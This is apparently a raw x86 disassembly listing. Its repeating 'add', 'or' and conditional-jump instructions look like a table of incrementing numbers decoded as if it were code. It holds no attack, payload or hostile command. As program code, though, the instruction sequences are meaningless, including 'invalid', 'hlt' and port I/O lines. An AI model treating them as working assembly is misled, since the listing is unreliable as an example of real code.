add al, byte [eax]
add byte [esi - 0x5ffffffe], bl
add al, byte [eax]
add byte [edx - 0x5bfffffe], ah
add al, byte [eax]
add byte [esi - 0x57fffffe], ah
add al, byte [eax]
add byte [edx - 0x53fffffe], ch
add al, byte [eax]
add byte [esi - 0x4ffffffe], ch
add al, byte [eax]
add byte [edx - 0x4bfffffe], dh
add al, byte [eax]
add byte [esi - 0x47fffffe], dh
add al, byte [eax]
add byte [edx - 0x43fffffe], bh
add al, byte [eax]
add byte [esi - 0x3ffffffe], bh
add al, byte [eax]
add dl, al
add al, byte [eax]
add ah, al
add al, byte [eax]
add dh, al
add al, byte [eax]
add al, cl
add al, byte [eax]
add dl, cl
add al, byte [eax]
add ah, cl
add al, byte [eax]
add dh, cl
add al, byte [eax]
add al, dl
add al, byte [eax]
add dl, dl
add al, byte [eax]
add ah, dl
add al, byte [eax]
add dh, dl
add al, byte [eax]
add al, bl
add al, byte [eax]
add dl, bl
add al, byte [eax]
add ah, bl
add al, byte [eax]
add dh, bl
add al, byte [eax]
add al, ah
add al, byte [eax]
add dl, ah
add al, byte [eax]
add ah, ah
add al, byte [eax]
add dh, ah
add al, byte [eax]
add al, ch
add al, byte [eax]
add dl, ch
add al, byte [eax]
add ah, ch
add al, byte [eax]
add dh, ch
add al, byte [eax]
add al, dh
add al, byte [eax]
add dl, dh
add al, byte [eax]
add ah, dh
add al, byte [eax]
add dh, dh
add al, byte [eax]
add al, bh
add al, byte [eax]
add dl, bh
add al, byte [eax]
add ah, bh
add al, byte [eax]
add dh, bh
add al, byte [eax]
add byte [eax], al
add eax, dword [eax]
add byte [edx], al
add eax, dword [eax]
add byte [ebx + eax], al
add byte [eax], al
push es
add eax, dword [eax]
add byte [eax], cl
add eax, dword [eax]
add byte [edx], cl
add eax, dword [eax]
add byte [ebx + eax], cl
add byte [eax], al
push cs
add eax, dword [eax]
add byte [eax], dl
add eax, dword [eax]
add byte [edx], dl
add eax, dword [eax]
add byte [ebx + eax], dl
add byte [eax], al
push ss
add eax, dword [eax]
add byte [eax], bl
add eax, dword [eax]
add byte [edx], bl
add eax, dword [eax]
add byte [ebx + eax], bl
add byte [eax], al
push ds
add eax, dword [eax]
add byte [eax], ah
add eax, dword [eax]
add byte [edx], ah
add eax, dword [eax]
add byte [ebx + eax], ah
add byte [eax], al
add eax, dword es:[eax]
add byte [eax], ch
add eax, dword [eax]
add byte [edx], ch
add eax, dword [eax]
add byte [ebx + eax], ch
add byte [eax], al
add eax, dword cs:[eax]
add byte [eax], dh
add eax, dword [eax]
add byte [edx], dh
add eax, dword [eax]
add byte [ebx + eax], dh
add byte [eax], al
add eax, dword ss:[eax]
add byte [eax], bh
add eax, dword [eax]
add byte [edx], bh
add eax, dword [eax]
add byte [ebx + eax], bh
add byte [eax], al
add eax, dword ds:[eax]
add byte [eax + 3], al
add byte [eax], al
inc edx
add eax, dword [eax]
add byte [ebx + eax], al
add byte [esi + 3], al
add byte [eax], al
dec eax
add eax, dword [eax]
add byte [edx + 3], cl
add byte [eax], al
dec esp
add eax, dword [eax]
add byte [esi + 3], cl
add byte [eax], al
push eax
add eax, dword [eax]
add byte [edx + 3], dl
add byte [eax], al
push esp
add eax, dword [eax]
add byte [esi + 3], dl
add byte [eax], al
pop eax
add eax, dword [eax]
add byte [edx + 3], bl
add byte [eax], al
pop esp
add eax, dword [eax]
add byte [esi + 3], bl
add byte [eax], al
pushal
add eax, dword [eax]
add byte [edx + 3], ah
add byte [eax], al
add eax, dword fs:[eax]
add byte [esi + 3], ah
add byte [eax], al
push 0x6a000003
add eax, dword [eax]
add byte [ebx + eax], ch
add byte [esi + 3], ch
add byte [eax], al
jo 0x8094d05
add byte [eax], al
jb 0x8094d09
add byte [eax], al
je 0x8094d0d
add byte [eax], al
jbe 0x8094d11
add byte [eax], al
js 0x8094d15
add byte [eax], al
jp 0x8094d19
add byte [eax], al
jl 0x8094d1d
add byte [eax], al
jle 0x8094d21
add byte [eax], al
add byte [ebx], 0
add byte [edx - 0x7bfffffd], al
add eax, dword [eax]
add byte [esi - 0x77fffffd], al
add eax, dword [eax]
add byte [edx - 0x73fffffd], cl
add eax, dword [eax]
add byte [esi - 0x6ffffffd], cl
add eax, dword [eax]
add byte [edx - 0x6bfffffd], dl
add eax, dword [eax]
add byte [esi - 0x67fffffd], dl
add eax, dword [eax]
add byte [edx - 0x63fffffd], bl
add eax, dword [eax]
add byte [esi - 0x5ffffffd], bl
add eax, dword [eax]
add byte [edx - 0x5bfffffd], ah
add eax, dword [eax]
add byte [esi - 0x57fffffd], ah
add eax, dword [eax]
add byte [edx - 0x53fffffd], ch
add eax, dword [eax]
add byte [esi - 0x4ffffffd], ch
add eax, dword [eax]
add byte [edx - 0x4bfffffd], dh
add eax, dword [eax]
add byte [esi - 0x47fffffd], dh
add eax, dword [eax]
add byte [edx - 0x43fffffd], bh
add eax, dword [eax]
add byte [esi - 0x3ffffffd], bh
add eax, dword [eax]
add dl, al
add eax, dword [eax]
add ah, al
add eax, dword [eax]
add dh, al
add eax, dword [eax]
add al, cl
add eax, dword [eax]
add dl, cl
add eax, dword [eax]
add ah, cl
add eax, dword [eax]
add dh, cl
add eax, dword [eax]
add al, dl
add eax, dword [eax]
add dl, dl
add eax, dword [eax]
add ah, dl
add eax, dword [eax]
add dh, dl
add eax, dword [eax]
add al, bl
add eax, dword [eax]
add dl, bl
add eax, dword [eax]
add ah, bl
add eax, dword [eax]
add dh, bl
add eax, dword [eax]
add al, ah
add eax, dword [eax]
add dl, ah
add eax, dword [eax]
add ah, ah
add eax, dword [eax]
add dh, ah
add eax, dword [eax]
add al, ch
add eax, dword [eax]
add dl, ch
add eax, dword [eax]
add ah, ch
add eax, dword [eax]
add dh, ch
add eax, dword [eax]
add al, dh
add eax, dword [eax]
add dl, dh
add eax, dword [eax]
add ah, dh
add eax, dword [eax]
add dh, dh
add eax, dword [eax]
add al, bh
add eax, dword [eax]
add dl, bh
add eax, dword [eax]
add ah, bh
add eax, dword [eax]
add dh, bh
add eax, dword [eax]
add byte [eax], al
add al, 0
add byte [edx], al
add al, 0
add byte [esp + eax], al
add byte [eax], al
push es
add al, 0
add byte [eax], cl
add al, 0
add byte [edx], cl
add al, 0
add byte [esp + eax], cl
add byte [eax], al
push cs
add al, 0
add byte [eax], dl
add al, 0
add byte [edx], dl
add al, 0
add byte [esp + eax], dl
add byte [eax], al
push ss
add al, 0
add byte [eax], bl
add al, 0
add byte [edx], bl
add al, 0
add byte [esp + eax], bl
add byte [eax], al
push ds
add al, 0
add byte [eax], ah
add al, 0
add byte [edx], ah
add al, 0
add byte [esp + eax], ah
add byte [eax], al
add al, 0
add byte [eax], ch
add al, 0
add byte [edx], ch
add al, 0
add byte [esp + eax], ch
add byte [eax], al
add al, 0
add byte [eax], dh
add al, 0
add byte [edx], dh
add al, 0
add byte [esp + eax], dh
add byte [eax], al
add al, 0
add byte [eax], bh
add al, 0
add byte [edx], bh
add al, 0
add byte [esp + eax], bh
add byte [eax], al
add al, 0
add byte [eax + 4], al
add byte [eax], al
inc edx
add al, 0
add byte [esp + eax], al
add byte [esi + 4], al
add byte [eax], al
dec eax
add al, 0
add byte [edx + 4], cl
add byte [eax], al
dec esp
add al, 0
add byte [esi + 4], cl
add byte [eax], al
push eax
add al, 0
add byte [edx + 4], dl
add byte [eax], al
push esp
add al, 0
add byte [esi + 4], dl
add byte [eax], al
pop eax
add al, 0
add byte [edx + 4], bl
add byte [eax], al
pop esp
add al, 0
add byte [esi + 4], bl
add byte [eax], al
pushal
add al, 0
add byte [edx + 4], ah
add byte [eax], al
add al, 0
add byte [esi + 4], ah
add byte [eax], al
push 0x6a000004
add al, 0
add byte [esp + eax], ch
add byte [esi + 4], ch
add byte [eax], al
jo 0x8094f06
add byte [eax], al
jb 0x8094f0a
add byte [eax], al
je 0x8094f0e
add byte [eax], al
jbe 0x8094f12
add byte [eax], al
js 0x8094f16
add byte [eax], al
jp 0x8094f1a
add byte [eax], al
jl 0x8094f1e
add byte [eax], al
jle 0x8094f22
add byte [eax], al
add byte [eax + eax], 0
add byte [eax + eax], 0
test byte [eax + eax], al
add byte [esi - 0x77fffffc], al
add al, 0
add byte [edx - 0x73fffffc], cl
add al, 0
add byte [esi - 0x6ffffffc], cl
add al, 0
add byte [edx - 0x6bfffffc], dl
add al, 0
add byte [esi - 0x67fffffc], dl
add al, 0
add byte [edx - 0x63fffffc], bl
add al, 0
add byte [esi - 0x5ffffffc], bl
add al, 0
add byte [edx - 0x5bfffffc], ah
add al, 0
add byte [esi - 0x57fffffc], ah
add al, 0
add byte [edx - 0x53fffffc], ch
add al, 0
add byte [esi - 0x4ffffffc], ch
add al, 0
add byte [edx - 0x4bfffffc], dh
add al, 0
add byte [esi - 0x47fffffc], dh
add al, 0
add byte [edx - 0x43fffffc], bh
add al, 0
add byte [esi - 0x3ffffffc], bh
add al, 0
add dl, al
add al, 0
add ah, al
add al, 0
add dh, al
add al, 0
add al, cl
add al, 0
add dl, cl
add al, 0
add ah, cl
add al, 0
add dh, cl
add al, 0
add al, dl
add al, 0
add dl, dl
add al, 0
add ah, dl
add al, 0
add dh, dl
add al, 0
add al, bl
add al, 0
add dl, bl
add al, 0
add ah, bl
add al, 0
add dh, bl
add al, 0
add al, ah
add al, 0
add dl, ah
add al, 0
add ah, ah
add al, 0
add dh, ah
add al, 0
add al, ch
add al, 0
add dl, ch
add al, 0
add ah, ch
add al, 0
add dh, ch
add al, 0
add al, dh
add al, 0
add dl, dh
add al, 0
add ah, dh
add al, 0
add dh, dh
add al, 0
add al, bh
add al, 0
add dl, bh
add al, 0
add ah, bh
add al, 0
add dh, bh
add al, 0
add byte [eax], al
add eax, 0x5020000
add byte [eax], al
add al, 5
add byte [eax], al
push es
add eax, 0x5080000
add byte [eax], al
or al, byte [0x50c0000]
add byte [eax], al
push cs
add eax, 0x5100000
add byte [eax], al
adc al, byte [0x5140000]
add byte [eax], al
push ss
add eax, 0x5180000
add byte [eax], al
sbb al, byte [0x51c0000]
add byte [eax], al
push ds
add eax, 0x5200000
add byte [eax], al
and al, byte [0x5240000]
add byte [eax], al
add eax, 0x5280000
add byte [eax], al
sub al, byte [0x52c0000]
add byte [eax], al
add eax, 0x5300000
add byte [eax], al
xor al, byte [0x5340000]
add byte [eax], al
add eax, 0x5380000
add byte [eax], al
cmp al, byte [0x53c0000]
add byte [eax], al
add eax, 0x5400000
add byte [eax], al
inc edx
add eax, 0x5440000
add byte [eax], al
inc esi
add eax, 0x5480000
add byte [eax], al
dec edx
add eax, 0x54c0000
add byte [eax], al
dec esi
add eax, 0x5500000
add byte [eax], al
push edx
add eax, 0x5540000
add byte [eax], al
push esi
add eax, 0x5580000
add byte [eax], al
pop edx
add eax, 0x55c0000
add byte [eax], al
pop esi
add eax, 0x5600000
add byte [eax], al
bound eax, qword [0x5640000]
add byte [eax], al
add ax, 0
push 0x6a000005
add eax, 0x56c0000
add byte [eax], al
outsb dx, byte [esi]
add eax, 0x5700000
add byte [eax], al
jb 0x809510b
add byte [eax], al
je 0x809510f
add byte [eax], al
jbe 0x8095113
add byte [eax], al
js 0x8095117
add byte [eax], al
jp 0x809511b
add byte [eax], al
jl 0x809511f
add byte [eax], al
jle 0x8095123
add byte [eax], al
add byte [0x5820000], 0
add byte [ebp + eax + 0x5860000], al
add byte [eax], al
mov byte [0x58a0000], al
add byte [eax], al
mov word [0x58e0000], es
add byte [eax], al
nop
add eax, 0x5920000
add byte [eax], al
xchg esp, eax
add eax, 0x5960000
add byte [eax], al
cwde
add eax, 0x59a0000
add byte [eax], al
pushfd
add eax, 0x59e0000
add byte [eax], al
mov al, byte [0xa2000005]
add eax, 0x5a40000
add byte [eax], al
cmpsb byte [esi], byte ptr es:[edi]
add eax, 0x5a80000
add byte [eax], al
stosb byte es:[edi], al
add eax, 0x5ac0000
add byte [eax], al
scasb al, byte es:[edi]
add eax, 0x5b00000
add byte [eax], al
mov dl, 5
add byte [eax], al
mov ah, 5
add byte [eax], al
mov dh, 5
add byte [eax], al
mov eax, 0xba000005
add eax, 0x5bc0000
add byte [eax], al
mov esi, 0xc0000005
add eax, 0x5c20000
add byte [eax], al
les eax, [0x5c60000]
add byte [eax], al
enter 5, 0
retf 5
add ah, cl
add eax, 0x5ce0000
add byte [eax], al
rol byte [0x5d20000], 1
add byte [eax], al
aam 5
add byte [eax], al
salc
add eax, 0x5d80000
add byte [eax], al
fiadd dword [0x5dc0000]
add byte [eax], al
fiadd word [0x5e00000]
add byte [eax], al
loop 0x80951eb
add byte [eax], al
in al, 5
add byte [eax], al
out 5, al
add byte [eax], al
call 0xf20951fa
add eax, 0x5ec0000
add byte [eax], al
out dx, al
add eax, 0x5f00000
add byte [eax], al
add eax, 0x5f40000
add byte [eax], al
test byte [0x5f80000], 0
add dl, bh
add eax, 0x5fc0000
add byte [eax], al
inc byte [0x6000000]
add byte [eax], al
add al, byte [esi]
add byte [eax], al
add al, 6
add byte [eax], al
push es
push es
add byte [eax], al
or byte [esi], al
add byte [eax], al
or al, byte [esi]
add byte [eax], al
or al, 6
add byte [eax], al
push cs
push es
add byte [eax], al
adc byte [esi], al
add byte [eax], al
adc al, byte [esi]
add byte [eax], al
adc al, 6
add byte [eax], al
push ss
push es
add byte [eax], al
sbb byte [esi], al
add byte [eax], al
sbb al, byte [esi]
add byte [eax], al
sbb al, 6
add byte [eax], al
push ds
push es
add byte [eax], al
and byte [esi], al
add byte [eax], al
and al, byte [esi]
add byte [eax], al
and al, 6
add byte [eax], al
push es
add byte [eax], al
sub byte [esi], al
add byte [eax], al
sub al, byte [esi]
add byte [eax], al
sub al, 6
add byte [eax], al
push es
add byte [eax], al
xor byte [esi], al
add byte [eax], al
xor al, byte [esi]
add byte [eax], al
xor al, 6
add byte [eax], al
push es
add byte [eax], al
cmp byte [esi], al
add byte [eax], al
cmp al, byte [esi]
add byte [eax], al
cmp al, 6
add byte [eax], al
push es
add byte [eax], al
inc eax
push es
add byte [eax], al
inc edx
push es
add byte [eax], al
inc esp
push es
add byte [eax], al
inc esi
push es
add byte [eax], al
dec eax
push es
add byte [eax], al
dec edx
push es
add byte [eax], al
dec esp
push es
add byte [eax], al
dec esi
push es
add byte [eax], al
push eax
push es
add byte [eax], al
push edx
push es
add byte [eax], al
push esp
push es
add byte [eax], al
push esi
push es
add byte [eax], al
pop eax
push es
add byte [eax], al
pop edx
push es
add byte [eax], al
pop esp
push es
add byte [eax], al
pop esi
push es
add byte [eax], al
pushal
push es
add byte [eax], al
bound eax, qword [esi]
add byte [eax], al
push es
add byte [eax], al
push es
add byte [eax], al
push 0x6a000006
push es
add byte [eax], al
insb byte es:[edi], dx
push es
add byte [eax], al
outsb dx, byte [esi]
push es
add byte [eax], al
jo 0x8095308
add byte [eax], al
jb 0x809530c
add byte [eax], al
je 0x8095310
add byte [eax], al
jbe 0x8095314
add byte [eax], al
js 0x8095318
add byte [eax], al
jp 0x809531c
add byte [eax], al
jl 0x8095320
add byte [eax], al
jle 0x8095324
add byte [eax], al
add byte [esi], 0
add byte [edx - 0x7bfffffa], al
push es
add byte [eax], al
xchg byte [esi], al
add byte [eax], al
mov byte [esi], al
add byte [eax], al
mov al, byte [esi]
add byte [eax], al
mov word [esi], es
add byte [eax], al
mov es, word [esi]
add byte [eax], al
nop
push es
add byte [eax], al
xchg edx, eax
push es
add byte [eax], al
xchg esp, eax
push es
add byte [eax], al
xchg esi, eax
push es
add byte [eax], al
cwde
push es
add byte [eax], al
lcall 6, 0x9c000006
add byte [esi - 0x5ffffffa], bl
push es
add byte [eax], al
mov byte [0xa4000006], al
push es
add byte [eax], al
cmpsb byte [esi], byte ptr es:[edi]
push es
add byte [eax], al
test al, 6
add byte [eax], al
stosb byte es:[edi], al
push es
add byte [eax], al
lodsb al, byte [esi]
push es
add byte [eax], al
scasb al, byte es:[edi]
push es
add byte [eax], al
mov al, 6
add byte [eax], al
mov dl, 6
add byte [eax], al
mov ah, 6
add byte [eax], al
mov dh, 6
add byte [eax], al
mov eax, 0xba000006
push es
add byte [eax], al
mov esp, 0xbe000006
push es
add byte [eax], al
rol byte [esi], 0
add dl, al
push es
add byte [eax], al
les eax, [esi]
add byte [eax], al
mov byte [esi], 0
add al, cl
push es
add byte [eax], al
retf 6
add ah, cl
push es
add byte [eax], al
into
push es
add byte [eax], al
rol byte [esi], 1
add byte [eax], al
rol byte [esi], cl
add byte [eax], al
aam 6
add byte [eax], al
salc
push es
add byte [eax], al
fadd dword [esi]
add byte [eax], al
fiadd dword [esi]
add byte [eax], al
fadd qword [esi]
add byte [eax], al
fiadd word [esi]
add byte [eax], al
loopne 0x80953e8
add byte [eax], al
loop 0x80953ec
add byte [eax], al
in al, 6
add byte [eax], al
out 6, al
add byte [eax], al
call 0xf20953fb
push es
add byte [eax], al
in al, dx
push es
add byte [eax], al
out dx, al
push es
add byte [eax], al
invalid
push es
add byte [eax], al
push es
add byte [eax], al
hlt
push es
add byte [eax], al
test byte [esi], 0
add al, bh
push es
add byte [eax], al
cli
push es
add byte [eax], al
cld
push es
add byte [eax], al
inc byte [esi]
add byte [eax], al
add byte [edi], al
add byte [eax], al
add al, byte [edi]
add byte [eax], al
add al, 7
add byte [eax], al
push es
pop es
add byte [eax], al
or byte [edi], al
add byte [eax], al
or al, byte [edi]
add byte [eax], al
or al, 7
add byte [eax], al
push cs
pop es
add byte [eax], al
adc byte [edi], al
add byte [eax], al
adc al, byte [edi]
add byte [eax], al
adc al, 7
add byte [eax], al
push ss
pop es
add byte [eax], al
sbb byte [edi], al
add byte [eax], al
sbb al, byte [edi]
add byte [eax], al
sbb al, 7
add byte [eax], al
push ds
pop es
add byte [eax], al
and byte [edi], al
add byte [eax], al
and al, byte [edi]
add byte [eax], al
and al, 7
add byte [eax], al
pop es
add byte [eax], al
sub byte [edi], al
add byte [eax], al
sub al, byte [edi]
add byte [eax], al
sub al, 7
add byte [eax], al
pop es
add byte [eax], al
xor byte [edi], al
add byte [eax], al
xor al, byte [edi]
add byte [eax], al
xor al, 7
add byte [eax], al
pop es
add byte [eax], al
cmp byte [edi], al
add byte [eax], al
cmp al, byte [edi]
add byte [eax], al
cmp al, 7
add byte [eax], al
pop es
add byte [eax], al
inc eax
pop es
add byte [eax], al
inc edx
pop es
add byte [eax], al
inc esp
pop es
add byte [eax], al
inc esi
pop es
add byte [eax], al
dec eax
pop es
add byte [eax], al
dec edx
pop es
add byte [eax], al
dec esp
pop es
add byte [eax], al
dec esi
pop es
add byte [eax], al
push eax
pop es
add byte [eax], al
push edx
pop es
add byte [eax], al
push esp
pop es
add byte [eax], al
push esi
pop es
add byte [eax], al
pop eax
pop es
add byte [eax], al
pop edx
pop es
add byte [eax], al
pop esp
pop es
add byte [eax], al
pop esi
pop es
add byte [eax], al
pushal
pop es
add byte [eax], al
bound eax, qword [edi]
add byte [eax], al
pop es
add byte [eax], al
pop es
add byte [eax], al
push 0x6a000007
pop es
add byte [eax], al
insb byte es:[edi], dx
pop es
add byte [eax], al
outsb dx, byte [esi]
pop es
add byte [eax], al
jo 0x8095509
add byte [eax], al
jb 0x809550d
add byte [eax], al
je 0x8095511
add byte [eax], al
jbe 0x8095515
add byte [eax], al
js 0x8095519
add byte [eax], al
jp 0x809551d
add byte [eax], al
jl 0x8095521
add byte [eax], al
jle 0x8095525
add byte [eax], al
add byte [edi], 0
add byte [edx - 0x7bfffff9], al
pop es
add byte [eax], al
xchg byte [edi], al
add byte [eax], al
mov byte [edi], al
add byte [eax], al
mov al, byte [edi]
add byte [eax], al
mov word [edi], es
add byte [eax], al
mov es, word [edi]
add byte [eax], al
nop
pop es
add byte [eax], al
xchg edx, eax
pop es
add byte [eax], al
xchg esp, eax
pop es
add byte [eax], al
xchg esi, eax
pop es
add byte [eax], al
cwde
pop es
add byte [eax], al
lcall 7, 0x9c000007
add byte [esi - 0x5ffffff9], bl
pop es
add byte [eax], al
mov byte [0xa4000007], al
pop es
add byte [eax], al
cmpsb byte [esi], byte ptr es:[edi]
pop es
add byte [eax], al
test al, 7
add byte [eax], al
stosb byte es:[edi], al
pop es
add byte [eax], al
lodsb al, byte [esi]
pop es
add byte [eax], al
scasb al, byte es:[edi]
pop es
add byte [eax], al
mov al, 7
add byte [eax], al
mov dl, 7
add byte [eax], al
mov ah, 7
add byte [eax], al
mov dh, 7
add byte [eax], al
mov eax, 0xba000007
pop es
add byte [eax], al
mov esp, 0xbe000007
pop es
add byte [eax], al
rol byte [edi], 0
add dl, al
pop es
add byte [eax], al
les eax, [edi]
add byte [eax], al
mov byte [edi], 0
add al, cl
pop es
add byte [eax], al
retf 7
add ah, cl
pop es
add byte [eax], al
into
pop es
add byte [eax], al
rol byte [edi], 1
add byte [eax], al
rol byte [edi], cl
add byte [eax], al
aam 7
add byte [eax], al
salc
pop es
add byte [eax], al
fadd dword [edi]
add byte [eax], al
fiadd dword [edi]
add byte [eax], al
fadd qword [edi]
add byte [eax], al
fiadd word [edi]
add byte [eax], al
loopne 0x80955e9
add byte [eax], al
loop 0x80955ed
add byte [eax], al
in al, 7
add byte [eax], al
out 7, al
add byte [eax], al
call 0xf20955fc
pop es
add byte [eax], al
in al, dx
pop es
add byte [eax], al
out dx, al
pop es
add byte [eax], al
invalid
pop es
add byte [eax], al
pop es
add byte [eax], al
hlt
pop es
add byte [eax], al
test byte [edi], 0
add al, bh
pop es
add byte [eax], al
cli
pop es
add byte [eax], al
cld
pop es
add byte [eax], al
inc byte [edi]
add byte [eax], al
add byte [eax], cl
add byte [eax], al
add cl, byte [eax]
add byte [eax], al
add al, 8
add byte [eax], al
push es
or byte [eax], al
add byte [eax], cl
or byte [eax], al
add byte [edx], cl
or byte [eax], al
add byte [eax + ecx], cl
add byte [eax], al
push cs
or byte [eax], al
add byte [eax], dl
or byte [eax], al
add byte [edx], dl
or byte [eax], al
add byte [eax + ecx], dl
add byte [eax], al
push ss
or byte [eax], al
add byte [eax], bl
or byte [eax], al
add byte [edx], bl
or byte [eax], al
add byte [eax + ecx], bl
add byte [eax], al
push ds
or byte [eax], al
add byte [eax], ah
or byte [eax], al
add byte [edx], ah
or byte [eax], al
add byte [eax + ecx], ah
add byte [eax], al
or byte es:[eax], al
add byte [eax], ch
or byte [eax], al
add byte [edx], ch
or byte [eax], al
add byte [eax + ecx], ch
add byte [eax], al
or byte cs:[eax], al
add byte [eax], dh
or byte [eax], al
add byte [edx], dh
or byte [eax], al
add byte [eax + ecx], dh
add byte [eax], al
or byte ss:[eax], al
add byte [eax], bh
or byte [eax], al
add byte [edx], bh
or byte [eax], al
add byte [eax + ecx], bh
add byte [eax], al
or byte ds:[eax], al
add byte [eax + 8], al
add byte [eax], al
inc edx
or byte [eax], al
add byte [eax + ecx], al
add byte [esi + 8], al
add byte [eax], al
dec eax
or byte [eax], al
add byte [edx + 8], cl
add byte [eax], al
dec esp
or byte [eax], al
add byte [esi + 8], cl
add byte [eax], al
push eax
or byte [eax], al
add byte [edx + 8], dl
add byte [eax], al
push esp
or byte [eax], al
add byte [esi + 8], dl
add byte [eax], al
pop eax
or byte [eax], al
add byte [edx + 8], bl
add byte [eax], al
pop esp
or byte [eax], al
add byte [esi + 8], bl
add byte [eax], al
pushal
or byte [eax], al
add byte [edx + 8], ah
add byte [eax], al
or byte fs:[eax], al
add byte [esi + 8], ah
add byte [eax], al
push 0x6a000008
or byte [eax], al
add byte [eax + ecx], ch
add byte [esi + 8], ch
add byte [eax], al
jo 0x809570a
add byte [eax], al
jb 0x809570e
add byte [eax], al
je 0x8095712
add byte [eax], al
jbe 0x8095716
add byte [eax], al
js 0x809571a
add byte [eax], al
jp 0x809571e
add byte [eax], al
jl 0x8095722
add byte [eax], al
jle 0x8095726
add byte [eax], al
or byte [eax], 0
add byte [edx - 0x7bfffff8], al
or byte [eax], al
add byte [esi - 0x77fffff8], al
or byte [eax], al
add byte [edx - 0x73fffff8], cl
or byte [eax], al
add byte [esi - 0x6ffffff8], cl
or byte [eax], al
add byte [edx - 0x6bfffff8], dl
or byte [eax], al
add byte [esi - 0x67fffff8], dl
or byte [eax], al
add byte [edx - 0x63fffff8], bl
or byte [eax], al
add byte [esi - 0x5ffffff8], bl
or byte [eax], al
add byte [edx - 0x5bfffff8], ah
or byte [eax], al
add byte [esi - 0x57fffff8], ah
or byte [eax], al
add byte [edx - 0x53fffff8], ch
or byte [eax], al
add byte [esi - 0x4ffffff8], ch
or byte [eax], al
add byte [edx - 0x4bfffff8], dh
or byte [eax], al
add byte [esi - 0x47fffff8], dh
or byte [eax], al
add byte [edx - 0x43fffff8], bh
or byte [eax], al
add byte [esi - 0x3ffffff8], bh
or byte [eax], al
add dl, al
or byte [eax], al
add ah, al
or byte [eax], al
add dh, al
or byte [eax], al
add al, cl
or byte [eax], al
add dl, cl
or byte [eax], al
add ah, cl
or byte [eax], al
add dh, cl
or byte [eax], al
add al, dl
or byte [eax], al
add dl, dl
or byte [eax], al
add ah, dl
or byte [eax], al
add dh, dl
or byte [eax], al
add al, bl
or byte [eax], al
add dl, bl
or byte [eax], al
add ah, bl
or byte [eax], al
add dh, bl
or byte [eax], al
add al, ah
or byte [eax], al
add dl, ah
or byte [eax], al
add ah, ah
or byte [eax], al
add dh, ah
or byte [eax], al
add al, ch
or byte [eax], al
add dl, ch
or byte [eax], al
add ah, ch
or byte [eax], al
add dh, ch
or byte [eax], al
add al, dh
or byte [eax], al
add dl, dh
or byte [eax], al
add ah, dh
or byte [eax], al
add dh, dh
or byte [eax], al
add al, bh
or byte [eax], al
add dl, bh
or byte [eax], al
add ah, bh
or byte [eax], al
add dh, bh
or byte [eax], al
add byte [eax], al
or dword [eax], eax
add byte [edx], al
or dword [eax], eax
add byte [ecx + ecx], al
add byte [eax], al
push es
or dword [eax], eax
add byte [eax], cl
or dword [eax], eax
add byte [edx], cl
or dword [eax], eax
add byte [ecx + ecx], cl
add byte [eax], al
push cs
or dword [eax], eax
add byte [eax], dl
or dword [eax], eax
add byte [edx], dl
or dword [eax], eax
add byte [ecx + ecx], dl
add byte [eax], al
push ss
or dword [eax], eax
add byte [eax], bl
or dword [eax], eax
add byte [edx], bl
or dword [eax], eax
add byte [ecx + ecx], bl
add byte [eax], al
push ds
or dword [eax], eax
add byte [eax], ah
or dword [eax], eax
add byte [edx], ah
or dword [eax], eax
add byte [ecx + ecx], ah
add byte [eax], al
or dword es:[eax], eax
add byte [eax], ch
or dword [eax], eax
add byte [edx], ch
or dword [eax], eax
add byte [ecx + ecx], ch
add byte [eax], al
or dword cs:[eax], eax
add byte [eax], dh
or dword [eax], eax
add byte [edx], dh
or dword [eax], eax
add byte [ecx + ecx], dh
add byte [eax], al
or dword ss:[eax], eax
add byte [eax], bh
or dword [eax], eax
add byte [edx], bh
or dword [eax], eax
add byte [ecx + ecx], bh
add byte [eax], al
or dword ds:[eax], eax
add byte [eax + 9], al
add byte [eax], al
inc edx
or dword [eax], eax
add byte [ecx + ecx], al
add byte [esi + 9], al
add byte [eax], al
dec eax
or dword [eax], eax
add byte [edx + 9], cl
add byte [eax], al
dec esp
or dword [eax], eax
add byte [esi + 9], cl
add byte [eax], al
push eax
or dword [eax], eax
add byte [edx + 9], dl
add byte [eax], al
push esp
or dword [eax], eax
add byte [esi + 9], dl
add byte [eax], al
pop eax
or dword [eax], eax
add byte [edx + 9], bl
add byte [eax], al
pop esp
or dword [eax], eax
add byte [esi + 9], bl
add byte [eax], al
pushal
or dword [eax], eax
add byte [edx + 9], ah
add byte [eax], al
or dword fs:[eax], eax
add byte [esi + 9], ah
add byte [eax], al
push 0x6a000009
or dword [eax], eax
add byte [ecx + ecx], ch
add byte [esi + 9], ch
add byte [eax], al
jo 0x809590b
add byte [eax], al
jb 0x809590f
add byte [eax], al
je 0x8095913
add byte [eax], al
jbe 0x8095917
add byte [eax], al
js 0x809591b
add byte [eax], al
jp 0x809591f
add byte [eax], al
jl 0x8095923
add byte [eax], al
jle 0x8095927
add byte [eax], al
or byte [ecx], 0
add byte [edx - 0x7bfffff7], al
or dword [eax], eax
add byte [esi - 0x77fffff7], al
or dword [eax], eax
add byte [edx - 0x73fffff7], cl
or dword [eax], eax
add byte [esi - 0x6ffffff7], cl
or dword [eax], eax
add byte [edx - 0x6bfffff7], dl
or dword [eax], eax
add byte [esi - 0x67fffff7], dl
or dword [eax], eax
add byte [edx - 0x63fffff7], bl
or dword [eax], eax
add byte [esi - 0x5ffffff7], bl
or dword [eax], eax
add byte [edx - 0x5bfffff7], ah
or dword [eax], eax
add byte [esi - 0x57fffff7], ah
or dword [eax], eax
add byte [edx - 0x53fffff7], ch
or dword [eax], eax
add byte [esi - 0x4ffffff7], ch
or dword [eax], eax
add byte [edx - 0x4bfffff7], dh
or dword [eax], eax
add byte [esi - 0x47fffff7], dh
or dword [eax], eax
add byte [edx - 0x43fffff7], bh
or dword [eax], eax
add byte [esi - 0x3ffffff7], bh
or dword [eax], eax
add dl, al
or dword [eax], eax
add ah, al
or dword [eax], eax
add dh, al
or dword [eax], eax
add al, cl
or dword [eax], eax
add dl, cl
or dword [eax], eax
add ah, cl
or dword [eax], eax
add dh, cl
or dword [eax], eax
add al, dl
or dword [eax], eax
add dl, dl
or dword [eax], eax
add ah, dl
or dword [eax], eax
add dh, dl
or dword [eax], eax
add al, bl
or dword [eax], eax
add dl, bl
or dword [eax], eax
add ah, bl
or dword [eax], eax
add dh, bl
or dword [eax], eax
add al, ah
or dword [eax], eax
add dl, ah
or dword [eax], eax
add ah, ah
or dword [eax], eax
add dh, ah
or dword [eax], eax
add al, ch
or dword [eax], eax
add dl, ch
or dword [eax], eax
add ah, ch
or dword [eax], eax
add dh, ch
or dword [eax], eax
add al, dh
or dword [eax], eax
add dl, dh
or dword [eax], eax
add ah, dh
